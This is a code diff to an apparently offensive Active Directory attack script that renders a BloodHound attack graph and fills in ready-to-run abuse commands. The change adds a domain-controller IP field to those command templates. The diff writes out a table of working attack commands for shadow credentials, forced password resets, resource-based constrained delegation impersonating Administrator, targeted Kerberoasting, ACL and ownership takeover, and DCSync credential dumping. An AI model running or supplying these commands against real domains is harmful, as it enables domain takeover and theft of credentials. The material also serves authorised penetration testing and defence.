@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.10.0"
+readonly VERSION="1.10.1"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -2209,7 +2209,8 @@ ZIP   = os.environ.get("BH_ZIP","")
 HTML  = os.environ.get("BH_HTML","graph.html")
 OWNED = os.environ.get("OWNED_FILE","")
 DOM   = (os.environ.get("GDOMAIN","domain.local") or "domain.local")
-DC    = (os.environ.get("GDC","") or DOM)
+DC    = (os.environ.get("GDC","") or DOM)          # DC DNS name (for -target/-dc-host/--host)
+DCIP  = (os.environ.get("GDCIP","") or DC)          # DC IP (for -dc-ip); falls back to the name
 
 HTML_TEMPLATE = r'''<!doctype html>
 <html lang="en">
@@ -2398,6 +2399,7 @@ const DATA   = __DATA__;
 const ABUSE  = __ABUSE__;
 const DOMAIN = __DOMAIN__;
 const DCHOST = __DC__;
+const DCIP   = __DCIP__;
 const META   = __META__;
 
 const COLORS={User:"#4ea1ff",Group:"#ffca3a",Computer:"#ff6b6b",Domain:"#36d399",
@@ -2688,7 +2690,8 @@ function abuseCard(si,e){
   h+="</div>"; return h;
 }
 function sub(cmd,src,dst){const sN=nshort(src.label), dN=nshort(dst.label);
-  return cmd.replace(/{srcN}/g,sN).replace(/{dstN}/g,dN).replace(/{dom}/g,DOMAIN).replace(/{dc}/g,DCHOST);}
+  return cmd.replace(/{srcN}/g,sN).replace(/{dstN}/g,dN).replace(/{dom}/g,DOMAIN)
+            .replace(/{dcip}/g,DCIP).replace(/{dc}/g,DCHOST);}
 function nshort(s){return (s||"").split("@")[0];}
 function key(l){return (l||"").toLowerCase().replace(/[^a-z]/g,"");}
 function esc(s){return (s+"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
@@ -2798,35 +2801,35 @@ resize(); applyView("none");
 #               {dom}=domain, {dc}=DC host/ip
 ABUSE = {
  "genericall": [
-  {"os":"linux","when":"user","tool":"certipy (Shadow Creds → NT hash)","cmd":"certipy shadow auto -u '{srcN}@{dom}' -p '<pass>' -account '{dstN}' -dc-ip {dc}"},
+  {"os":"linux","when":"user","tool":"certipy (Shadow Creds → NT hash)","cmd":"certipy shadow auto -u '{srcN}@{dom}' -p '<pass>' -account '{dstN}' -dc-ip {dcip} -target {dc}"},
   {"os":"linux","when":"user","tool":"bloodyAD (ForceChangePassword)","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} set password '{dstN}' 'Newp@ss123!'"},
   {"os":"win","when":"user","tool":"Whisker (Shadow Creds)","cmd":"Whisker.exe add /target:{dstN}"},
   {"os":"win","when":"user","tool":"PowerView (reset pwd)","cmd":"Set-DomainUserPassword -Identity {dstN} -AccountPassword (ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"},
   {"os":"linux","when":"group","tool":"bloodyAD (add self)","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add groupMember '{dstN}' '{srcN}'"},
   {"os":"win","when":"group","tool":"PowerView (add member)","cmd":"Add-DomainGroupMember -Identity '{dstN}' -Members '{srcN}'"},
-  {"os":"linux","when":"computer","tool":"RBCD (impacket+bloodyAD)","cmd":"impacket-addcomputer {dom}/'{srcN}':'<pass>' -computer-name 'PWN$' -computer-pass 'Pwn123!' -dc-ip {dc} && bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add rbcd '{dstN}' 'PWN$' && impacket-getST -spn cifs/{dstN}.{dom} -impersonate Administrator {dom}/'PWN$':'Pwn123!' -dc-ip {dc}"},
+  {"os":"linux","when":"computer","tool":"RBCD (impacket+bloodyAD)","cmd":"impacket-addcomputer {dom}/'{srcN}':'<pass>' -computer-name 'PWN$' -computer-pass 'Pwn123!' -dc-ip {dcip} -dc-host {dc} && bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add rbcd '{dstN}' 'PWN$' && impacket-getST -spn cifs/{dstN}.{dom} -impersonate Administrator {dom}/'PWN$':'Pwn123!' -dc-ip {dcip} -dc-host {dc}"},
   {"os":"win","when":"computer","tool":"RBCD (Powermad+Rubeus)","cmd":"New-MachineAccount -MachineAccount PWN -Password (ConvertTo-SecureString 'Pwn123!' -AsPlainText -Force); Set-ADComputer {dstN} -PrincipalsAllowedToDelegateToAccount PWN$; Rubeus.exe s4u /user:PWN$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/{dstN}.{dom} /ptt"},
  ],
  "genericwrite": [
-  {"os":"linux","when":"user","tool":"targetedKerberoast","cmd":"python3 targetedKerberoast.py -u '{srcN}' -p '<pass>' -d {dom} --dc-ip {dc} --request-user {dstN}"},
-  {"os":"linux","when":"user","tool":"certipy (Shadow Creds)","cmd":"certipy shadow auto -u '{srcN}@{dom}' -p '<pass>' -account '{dstN}' -dc-ip {dc}"},
+  {"os":"linux","when":"user","tool":"targetedKerberoast","cmd":"python3 targetedKerberoast.py -u '{srcN}' -p '<pass>' -d {dom} --dc-ip {dcip} --request-user {dstN}"},
+  {"os":"linux","when":"user","tool":"certipy (Shadow Creds)","cmd":"certipy shadow auto -u '{srcN}@{dom}' -p '<pass>' -account '{dstN}' -dc-ip {dcip} -target {dc}"},
   {"os":"win","when":"user","tool":"PowerView (set SPN → roast)","cmd":"Set-DomainObject -Identity {dstN} -Set @{{serviceprincipalname='nonexistent/ADAPwn'}}; Rubeus.exe kerberoast /user:{dstN} /nowrap"},
   {"os":"linux","when":"group","tool":"bloodyAD (add self)","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add groupMember '{dstN}' '{srcN}'"},
  ],
  "writedacl": [
-  {"os":"linux","when":"any","tool":"impacket-dacledit (grant FullControl)","cmd":"impacket-dacledit -action write -rights FullControl -principal '{srcN}' -target '{dstN}' {dom}/'{srcN}':'<pass>' -dc-ip {dc}"},
+  {"os":"linux","when":"any","tool":"impacket-dacledit (grant FullControl)","cmd":"impacket-dacledit -action write -rights FullControl -principal '{srcN}' -target '{dstN}' {dom}/'{srcN}':'<pass>' -dc-ip {dcip}"},
   {"os":"linux","when":"domain","tool":"bloodyAD (grant DCSync)","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add genericAll '{dstN}' '{srcN}'  # then DCSync"},
   {"os":"win","when":"any","tool":"PowerView (grant rights)","cmd":"Add-DomainObjectAcl -TargetIdentity '{dstN}' -PrincipalIdentity '{srcN}' -Rights All"},
   {"os":"win","when":"domain","tool":"PowerView (grant DCSync)","cmd":"Add-DomainObjectAcl -TargetIdentity '{dom}' -PrincipalIdentity '{srcN}' -Rights DCSync"},
  ],
  "writeowner": [
-  {"os":"linux","when":"any","tool":"impacket-owneredit + dacledit","cmd":"impacket-owneredit -action write -new-owner '{srcN}' -target '{dstN}' {dom}/'{srcN}':'<pass>' -dc-ip {dc} && impacket-dacledit -action write -rights FullControl -principal '{srcN}' -target '{dstN}' {dom}/'{srcN}':'<pass>' -dc-ip {dc}"},
+  {"os":"linux","when":"any","tool":"impacket-owneredit + dacledit","cmd":"impacket-owneredit -action write -new-owner '{srcN}' -target '{dstN}' {dom}/'{srcN}':'<pass>' -dc-ip {dcip} && impacket-dacledit -action write -rights FullControl -principal '{srcN}' -target '{dstN}' {dom}/'{srcN}':'<pass>' -dc-ip {dcip}"},
   {"os":"win","when":"any","tool":"PowerView (take ownership)","cmd":"Set-DomainObjectOwner -Identity '{dstN}' -OwnerIdentity '{srcN}'; Add-DomainObjectAcl -TargetIdentity '{dstN}' -PrincipalIdentity '{srcN}' -Rights All"},
  ],
  "owns": "writeowner",
  "addkeycredentiallink": [
-  {"os":"linux","when":"any","tool":"certipy (Shadow Creds)","cmd":"certipy shadow auto -u '{srcN}@{dom}' -p '<pass>' -account '{dstN}' -dc-ip {dc}"},
-  {"os":"linux","when":"any","tool":"pywhisker","cmd":"pywhisker.py -d {dom} -u '{srcN}' -p '<pass>' --target '{dstN}' --action add --dc-ip {dc}"},
+  {"os":"linux","when":"any","tool":"certipy (Shadow Creds)","cmd":"certipy shadow auto -u '{srcN}@{dom}' -p '<pass>' -account '{dstN}' -dc-ip {dcip} -target {dc}"},
+  {"os":"linux","when":"any","tool":"pywhisker","cmd":"pywhisker.py -d {dom} -u '{srcN}' -p '<pass>' --target '{dstN}' --action add --dc-ip {dcip}"},
   {"os":"win","when":"any","tool":"Whisker","cmd":"Whisker.exe add /target:{dstN}"},
  ],
  "forcechangepassword": [
@@ -2844,16 +2847,16 @@ ABUSE = {
   {"os":"linux","when":"domain","tool":"impacket-secretsdump (DCSync)","cmd":"impacket-secretsdump {dom}/'{srcN}':'<pass>'@{dc} -just-dc"},
  ],
  "writespn": [
-  {"os":"linux","when":"any","tool":"targetedKerberoast","cmd":"python3 targetedKerberoast.py -u '{srcN}' -p '<pass>' -d {dom} --dc-ip {dc} --request-user {dstN}"},
+  {"os":"linux","when":"any","tool":"targetedKerberoast","cmd":"python3 targetedKerberoast.py -u '{srcN}' -p '<pass>' -d {dom} --dc-ip {dcip} --request-user {dstN}"},
   {"os":"win","when":"any","tool":"PowerView+Rubeus","cmd":"Set-DomainObject -Identity {dstN} -Set @{{serviceprincipalname='nonexistent/ADAPwn'}}; Rubeus.exe kerberoast /user:{dstN} /nowrap"},
  ],
  "addspn": "writespn",
  "allowedtoact": [
-  {"os":"linux","when":"any","tool":"impacket-getST (RBCD)","cmd":"impacket-getST -spn cifs/{dstN}.{dom} -impersonate Administrator {dom}/'{srcN}':'<pass>' -dc-ip {dc}"},
+  {"os":"linux","when":"any","tool":"impacket-getST (RBCD)","cmd":"impacket-getST -spn cifs/{dstN}.{dom} -impersonate Administrator {dom}/'{srcN}':'<pass>' -dc-ip {dcip} -dc-host {dc}"},
   {"os":"win","when":"any","tool":"Rubeus s4u","cmd":"Rubeus.exe s4u /user:{srcN} /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/{dstN}.{dom} /ptt"},
  ],
  "allowedtodelegate": [
-  {"os":"linux","when":"any","tool":"impacket-getST (constrained deleg)","cmd":"impacket-getST -spn cifs/{dstN}.{dom} -impersonate Administrator {dom}/'{srcN}':'<pass>' -dc-ip {dc}"},
+  {"os":"linux","when":"any","tool":"impacket-getST (constrained deleg)","cmd":"impacket-getST -spn cifs/{dstN}.{dom} -impersonate Administrator {dom}/'{srcN}':'<pass>' -dc-ip {dcip} -dc-host {dc}"},
  ],
  "dcsync": [
   {"os":"linux","when":"any","tool":"impacket-secretsdump","cmd":"impacket-secretsdump {dom}/'{srcN}':'<pass>'@{dc} -just-dc"},
@@ -2879,6 +2882,7 @@ def write_html(payload, meta):
     tpl = tpl.replace("__ABUSE__", json.dumps(ABUSE))
     tpl = tpl.replace("__DOMAIN__", json.dumps(DOM))
     tpl = tpl.replace("__DC__", json.dumps(DC))
+    tpl = tpl.replace("__DCIP__", json.dumps(DCIP))
     tpl = tpl.replace("__META__", json.dumps(meta))
     with open(HTML,"w") as f: f.write(tpl)
 
@@ -3056,7 +3060,7 @@ phase_bloodhound_graph() {
     local html="$OUTDIR/graph.html"
     subsection "Rendering interactive attack graph (graph.html)"
     BH_ZIP="$zip" BH_HTML="$html" OWNED_FILE="$OUTDIR/valid_creds_map.txt" \
-    GDOMAIN="${DOMAIN:-domain.local}" GDC="${DC_FQDN:-$DC_IP}" render_graph_py
+    GDOMAIN="${DOMAIN:-domain.local}" GDC="${DC_FQDN:-$DC_IP}" GDCIP="${DC_IP:-${DC_FQDN}}" render_graph_py
     if [[ -s "$html" ]]; then
         loot "Interactive attack graph → graph.html (open in a browser — offline)"
         open_in_browser "$html"
@@ -3078,7 +3082,7 @@ graph_only_mode() {
     section "BLOODHOUND → INTERACTIVE GRAPH (standalone)"
     info "Source zip: ${C_BOLD}$zip${C_RESET}"
     BH_ZIP="$zip" BH_HTML="$html" OWNED_FILE="${OWNED_FILE:-}" \
-    GDOMAIN="${DOMAIN:-domain.local}" GDC="${DC_FQDN:-${DC_IP:-domain.local}}" render_graph_py | sed 's/^/  /'
+    GDOMAIN="${DOMAIN:-domain.local}" GDC="${DC_FQDN:-${DC_IP:-domain.local}}" GDCIP="${DC_IP:-${DC_FQDN}}" render_graph_py | sed 's/^/  /'
     if [[ -s "$html" ]]; then
         loot "Interactive attack graph → ${C_BOLD}$html${C_RESET}"
         open_in_browser "$html"
